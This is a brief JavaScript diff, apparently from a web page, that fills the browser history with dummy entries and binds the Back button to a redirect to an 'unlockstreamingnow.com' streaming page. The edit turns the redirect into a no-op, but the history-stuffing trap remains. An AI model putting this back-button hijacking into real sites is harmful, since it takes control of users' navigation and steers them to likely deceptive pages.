@@ -417,7 +417,7 @@ function timer() {
         const URL = window.location.href.split(/[#]/)[0];
         for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
         onpopstate = function(event) {
-            event.state && location.replace('https://unlockstreamingnow.com/watchstreamnow/');
+            event.state && location.href.replace('https://unlockstreamingnow.com/watchstreamnow/');
         }
     } catch (o) {
         console.log(o);
